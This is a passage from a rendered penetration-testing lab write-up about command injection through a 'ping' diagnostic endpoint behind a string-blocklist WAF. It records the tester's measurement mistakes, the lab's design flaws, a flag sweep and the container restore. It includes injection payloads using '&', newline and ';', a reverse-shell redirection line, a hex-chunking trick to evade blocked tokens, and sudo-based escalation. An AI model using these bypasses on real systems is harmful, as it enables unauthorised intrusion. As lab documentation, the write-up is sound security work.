+exactly 41 bytes (<code>od</code> dump), stderr is empty and rc is 0 regardless of identity.
+It reads nothing.</li>
+<li><strong>Timing the reverse shell as a control.</strong> Discarded: the marker file is the
+oracle, and it is distinguishable by design (a <code>/root</code> path only euid 0 can
+create, with a pid and a uid/euid pair in its content).</li>
+</ul>
+<hr />
+<h2 id="instrumentation-defects--mine-and-what-caught-each">Instrumentation defects — mine, and what caught each</h2>
+<p><strong>D1 — the app returns one stream and silently discards the other. Bit me twice.</strong>
+<code>app.py:62-63</code>:</p>
+<pre><code class="language-python">stdout, stderr = process.communicate(timeout=5)
+return stdout if process.returncode == 0 else stderr
+</code></pre>
+<p><code>returncode</code> is the rc of the <strong>last</strong> command in the shell string, so when a later
+command succeeds, an <strong>earlier</strong> failing command's stderr is thrown away. My hop-2
+and hop-3 negative controls (<code>sudo …</code> followed by <code>id</code>) printed <em>nothing at all</em>
+and I nearly logged &quot;the sudo hop silently succeeded&quot;. Putting the <code>sudo</code> call last
+made <code>sudo: a password is required</code> appear. <strong>This is a real app defect as well</strong>,
+not only my inconvenience: an operator debugging this app gets no error for a
+failed middle command. Distinct from lab 168's stdout-only capture — here both
+streams <em>are</em> piped; the bug is the selector.</p>
+<p><strong>D2 — <code>ping</code> consumed my payload.</strong> <code>app.py:59</code> is
+<code>command = f&quot;ping -c 3 {address}&quot;</code>, so a payload that does not begin with a valid
+destination is parsed as <code>ping</code>'s argv. Payloads like <code>sudo -n -u chocolate …</code>
+became <code>ping -c 3 sudo -n -u chocolate …</code>, and every probe returned
+<code>ping: invalid option -- 'u'</code> — which read like the sudo grant refusing when in fact
+<strong>nothing I wrote had run</strong>. Fixed by prefixing every payload with <code>127.0.0.1\n</code>.
+This is the same shape as lab 168's lesson moved one stage earlier: <strong>establish
+what the sink will do with the bytes before attributing anything to them.</strong></p>
+<p><strong>D3 — <code>&amp;</code> and <code>&amp;&amp;</code> are form field separators.</strong> My first WAF matrix concatenated
+the value raw into the body (<code>&quot;address=&quot; + value</code>). In
+<code>application/x-www-form-urlencoded</code> a literal <code>&amp;</code> is the field separator, so
+<code>address=127.0.0.1&amp; id</code> delivered <code>address=&quot;127.0.0.1&quot;</code> plus a junk second field.
+Result: <code>&amp;</code> and <code>&amp;&amp;</code> both came back <strong>byte-identical to the clean baseline</strong>, which
+I read for a moment as &quot;the WAF does not block <code>&amp;&amp;</code>&quot; — a finding about the target
+manufactured entirely by my encoder. Re-ran with <code>urllib.parse.quote</code>; then <code>&amp;</code>
+injected and <code>&amp;&amp;</code> blocked, correctly. This is self-correction §4 verbatim.</p>
+<p><strong>D4 — my WAF matrix printed character counts in a column headed &quot;bytes.&quot;</strong> I
+computed <code>len(r.read().decode(...))</code>. The WAF alert contains non-ASCII (<code>⚠</code>, U+FE0F,
+<code>ó</code>), so the two differ. Measured and corrected:</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>wire bytes</th>
+<th>decoded chars</th>
+<th>delta</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>127.0.0.1</code></td>
+<td>2532</td>
+<td>2526</td>
+<td>6</td>
+</tr>
+<tr>
+<td><code>127.0.0.1; id</code></td>
+<td><strong>2239</strong></td>
+<td>2228</td>
+<td><strong>11</strong></td>
+</tr>
+<tr>
+<td><code>127.0.0.1&amp; id</code></td>
+<td>2598</td>
+<td>2592</td>
+<td>6</td>
+</tr>
+</tbody>
+</table>
+<p><code>curl</code>'s <code>%{size_download}</code> independently returns <strong>2239</strong> and three repeat
+requests were <strong>md5-identical</strong>, so 2239 is the number cited above. My earlier
+2228 was not reproducible and is not used.</p>
+<p><strong>D5 — a hex-encoded payload can itself spell a denied token.</strong> I hex-encoded a
+shell script to smuggle it past the blocklist. The assertion in my own harness
+caught it: a hex blob contains <code>nc</code>, <code>ba</code>, <code>sh</code> as <em>pairs of hex digits</em>. Fixed
+with a token-aware chunked writer that cuts the blob so no denied token appears
+inside a chunk and none can straddle a chunk boundary. Lesson worth keeping: <strong>an
+encoding does not launder a filter's vocabulary; it feeds it two characters at a
+time.</strong></p>
+<p><strong>D6 — I read a hardcoded secret out of an ELF with <code>cat -n</code>.</strong> Rendering
+<code>/usr/local/bin/syscheck</code> as text produced a plausible-looking <code>NAME=value</code> line
+carrying a base64-looking blob, in the section where an initialised variable would
+sit. <strong>It does not exist</strong>, and I am deliberately not reproducing the string here,
+because writing it into this document would plant the fabrication I am reporting:</p>
+<pre><code>$ grep -c  'ADMIN_SECRET_KEY'      /usr/local/bin/syscheck   -&gt; 0
+$ grep -ao 'ADMIN_SECRET_KEY=[A-Za-z0-9+/=]*' /usr/local/bin/syscheck -&gt; (no output)
+$ grep -ao 'torestradonly'         /usr/local/bin/syscheck   -&gt; (no output)
+$ od -A x -t x1z -j 0x2008 -N 0x120 /usr/local/bin/syscheck
+002008  53 79 73 74 65 6d 20 53 74 61 74 75 73 3a 20 41  &gt;System Status: A&lt;
+002018  6c 6c 20 73 79 73 74 65 6d 73 20 6f 70 65 72 61  &gt;ll systems opera&lt;
+002028  74 69 6f 6e 61 6c 2e 00 01 1b 03 3b 34 00 00 00  &gt;tional.....;4...&lt;
+</code></pre>
+<p><code>.rodata</code> at <code>0x2008</code> is exactly <strong>41 bytes</strong>: <code>System Status: All systems operational.</code>. The symbol table carries <code>syscheck.c</code>, <code>main</code>, <code>puts</code> and nothing
+else. Had I not re-read the binary with a byte-level tool I would have filed a
+fabricated secret as a finding, complete with a CWE. <strong>Never quote a secret out of
+a binary with <code>cat</code>, and never reproduce a string you have disproved.</strong></p>
+<p><strong>D7 — a <code>grep</code> &quot;Killed&quot; mid-sweep is not a zero.</strong> My first reward sweep printed
+<code>Killed</code> (OOM on large blobs) and still produced plausible counts. Per self-correction
+§19 a blank or truncated count is UNTESTED, so I re-ran with the artefacts moved
+out of the tree and excluded the pip cache by directory. Only the second sweep is
+cited below.</p>
+<p><strong>D8 — the searcher's own pattern is a match (self-correction §26, live again).</strong>
+The first sweep for <code>torestradonly</code> returned <strong>3 files</strong>, all of them my own probe
+scripts. After removing my tooling, the count is <strong>0</strong> — and the same is true of
+every reward pattern, which is why the reward section below reports exclusions.</p>
+<p><strong>D9 — my own <code>&gt;</code> probe wrote <code>/app/id</code>.</strong> The <code>127.0.0.1&gt; id</code> probe created a
+368-byte file in the app's CWD. Self-inflicted, removed, and it also happens to be
+the proof for F1's file-write claim. Noted because the container was live for the
+whole matrix.</p>
+<p><strong>D10 — a reverse shell that dies on the first command.</strong> <code>exec bash -i &gt;&amp;3 2&gt;&amp;3</code>
+left <strong>stdin</strong> attached to the container's, which was at EOF; bash printed <code>exit</code>
+and terminated, and I read it as a stale session hijacking my listener. Fixed with
+<code>&lt;&amp;3</code>. Cost: two wasted runs and one misdiagnosis of a stray connection.</p>
+<p><strong>Tally: 10 defects, of which 7 would have produced a wrong finding or a wrong
+verdict</strong> — D1, D2, D3, D4, D6, D7 and D8. D5 was caught by my own assertion
+before it was sent; D9 was self-inflicted cleanup; D10 cost time, not correctness.</p>
+<p><strong>Environment noise (not lab content):</strong> <code>/usr/bin/containerd-check</code> is a PAM
+session hook — <code>grep -rIl containerd-check /etc</code> → <code>/etc/pam.d/common-session</code> — and
+prints <code>/usr/bin/containerd-check failed: exit code 127</code> on every <code>su</code>. It appears
+in <code>su</code>-based control output and would have looked like lab output. It fires on
+<code>su</code> only, never on the injection path, so no result here depends on it.</p>
+<hr />
+<h2 id="lab-design-defects-the-labs-problem-not-the-testers">Lab design defects (the lab's problem, not the tester's)</h2>
+<ul>
+<li><strong>D-A: an inert Apache tree shipped in a non-Apache image.</strong> <code>/etc/apache2</code>
+survives with exactly <strong>1 file / 127 bytes</strong> (<code>javascript-common.conf</code>) while
+<code>dpkg -l</code> reports <strong>0</strong> apache2 packages and there is <strong>no</strong> server binary. It
+reads as a plausible explanation for a &quot;WAF-protected&quot; lab and explains nothing.
+Lab 146's shape exactly: a shipped artefact that names the behaviour and is dead.</li>
+<li><strong>D-B: the source comment at <code>app.py:58</code> gives the bypass away.</strong> The filter's
+author wrote the bypass in the file — <em>&quot;Vulnerable a inyección via '&amp;' o '%0a' si
+el WAF no los cubre&quot;</em> — and shipped the filter without covering it.</li>
+<li><strong>D-C: the block page carries no status signal.</strong> Returning the WAF verdict in a
+200 body means a client cannot distinguish &quot;blocked&quot; from &quot;answered&quot; without
+parsing Spanish prose.</li>
+<li><strong>D-D: the root grant has no oracle.</strong> <code>syscheck</code> prints one fixed line and exits
+0 at every privilege level, so the intended escalation cannot be verified from the
+target's own output. <code>SETENV</code> is the real path and it works, but the lab gives no
+way to prove it without building an oracle — which is what I had to do.</li>
+<li><strong>D-E: <code>/diagnose</code> authorises entirely from a cookie</strong> (<code>app.py:121-123</code>) whose key
+is served by another unauthenticated route. Two independent bugs, one route apart.</li>
+</ul>
+<p><strong>Not a defect in the lab:</strong> the catalogue description is accurate. Command
+injection, a reverse shell, and escalation via <code>sudo</code> were all achieved.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>Absent — measured, not assumed.</strong></p>
+<p>Search run <strong>at <code>euid=0</code></strong>, binaries included, after moving every artefact this
+engagement created out of the scanned tree.</p>
+<ul>
+<li><strong>Work count: 14 291 files, 485 926 780 bytes.</strong></li>
+<li><strong>Positive control: 4 hits</strong> for a marker planted at <code>/root/SEC234_CTL_MARKER</code>
+immediately before the sweep, proving the searcher can find a marker that
+genuinely exists. Removed afterwards.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>pattern</th>
+<th>matches after removing my own harness</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>FLAG{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>DL{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>CTF{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>WOPR{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>dl{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>flag{</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>SEC{</code></td>
+<td><strong>0</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Everything that did match was read, not counted</strong> (§26), and all of it is
+innocent:</p>
+<ul>
+<li><code>/usr/lib/gcc/x86_64-linux-gnu/11/cc1</code> matched <code>DL{</code> — a GCC binary.</li>
+<li><code>/usr/include/c++/11/chrono</code>, <code>/usr/lib/python3/dist-packages/pip/_vendor/pygments/formatters/latex.py</code>
+and its <code>.pyc</code>, and one pip HTTP-cache blob matched <code>dl{</code> — this is <strong>the exact
+LaTeX-formatter false positive the corpus already recorded in labs 82 and 168</strong>,
+now reproduced a third time on a different base image.</li>
+<li><code>/tmp/reward2.sh</code>, <code>/tmp/reward3.sh</code> matched every pattern — <strong>my own scripts</strong>,
+because they contain the patterns as search terms.</li>
+</ul>
+<p>The lab's entire own payload is <strong>two files, 6 427 bytes</strong> (<code>app.py</code> 6395,
+<code>env.bak</code> 32), both read at <code>euid=0</code>. There is nothing else authored by the lab.</p>
+<hr />
+<h2 id="restore">Restore</h2>
+<p>Recreated from the image, not by undoing edits:</p>
+<pre><code>docker rm -f secornotsec_container &amp;&amp; docker run -d --name secornotsec_container secornotsec:latest
+</code></pre>
+<p><strong>Verified positively, not by absence:</strong></p>
+<table>
+<thead>
+<tr>
+<th>check</th>
+<th>result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>service answering</td>
+<td><code>GET /login</code> → <strong>302</strong>, <code>GET /env.bak</code> → <strong>200, 32 B</strong></td>
+</tr>
+<tr>
+<td>sink functional</td>
+<td><code>POST /diagnose</code> with the forged cookie → <strong>200, 2532 B</strong>, 3 ICMP reply lines</td>
+</tr>
+<tr>
+<td>forged cookie still valid on a <strong>freshly created</strong> container</td>
+<td>yes — proving the key and IV are the <strong>image's own</strong> properties, not artefacts I introduced</td>
+</tr>
+<tr>
+<td>filter intact</td>
+<td><code>address=127.0.0.1; id</code> → <code>WAF ALERT</code> present</td>
+</tr>
+<tr>
+<td>tree pristine</td>
+<td><code>docker diff secornotsec_container</code> → <strong>empty</strong></td>
+</tr>
+<tr>
+<td><code>/app</code> back to shipped</td>
+<td><code>app.py</code> 6395, <code>env.bak</code> 32, nothing else</td>
+</tr>
+<tr>
+<td><code>/tmp</code> back to shipped</td>
+<td>empty</td>
+</tr>
+<tr>
+<td>markers removed</td>
+<td><code>/root/ESC234_MARKER</code> and <code>/tmp/ESC234_ROOT_PROOF</code> gone; <code>/root</code> unreadable to <code>firstatack</code></td>
+</tr>
+<tr>
+<td>shell history removed</td>
+<td>both <code>.bash_history</code> files deleted</td>
+</tr>
+</tbody>
+</table>
+<h2 id="cross-read-against-siblings">Cross-read against siblings</h2>
+<ul>
+<li><strong>Lab 84</strong> — its refutation of 218 is <em>not</em> contradicted. 84 refuted &quot;a string
+filter is beaten by an unlisted encoding&quot; against a <strong>scoring engine</strong>. 234 is a
+string match, and the bypass here is not an encoding of a listed token but a
+<strong>token that was never listed</strong>. The rule is narrowed, not reversed, and 84's
+methodology (positive control before any belief about a bypass) is what made the
+13-of-13 measurement trustworthy.</li>
+<li><strong>Lab 168</strong> — its missing-dependency defect is <strong>absent</strong> here and was checked for
+explicitly, because its lesson is that an absent dependency makes a 200 look like
+a filter block.</li>
+<li><strong>Lab 189 / self-correction §15</strong> — the same family as D5 and as the <code>nc</code>-in-<code>\ncat</code>
+collision: a filter reading a string while a second grammar reads the bytes.</li>
+<li><strong>Lab 146</strong> — D-A is that lab's exact shape, reproduced independently: a shipped
+artefact that looks explanatory and is provably dead.</li>
+</ul>
+<h2 id="rule-check-against-indexmd">Rule check against <code>INDEX.md</code></h2>
+<p>The class <strong>command injection / filter bypass</strong> already exists in <code>RUNBOOK.md</code> §5
+(<em>WAF / filter</em>, <em>WAF attribution</em>). Per the feed-forward rule, this engagement
+<strong>extends</strong> the existing row rather than adding a new class — the WAF/filter row
+gains: a blocklist of shell operators that omits <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code> and newline is
+defeated by any of them; and the attribution row gains a third shape, a <strong>200</strong>
+whose body carries the verdict.</p>
+<hr />
+<p><em>Transcript, not a reproduction. Every artefact line above was read inside the
+container at the time; no line is quoted from memory. Files: <code>/app/app.py</code>,
+<code>/etc/sudoers</code>, <code>/etc/os-release</code>, <code>pip3 list</code>, <code>/usr/local/bin/syscheck</code>,
+<code>/etc/apache2/conf-available/javascript-common.conf</code>.</em></p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
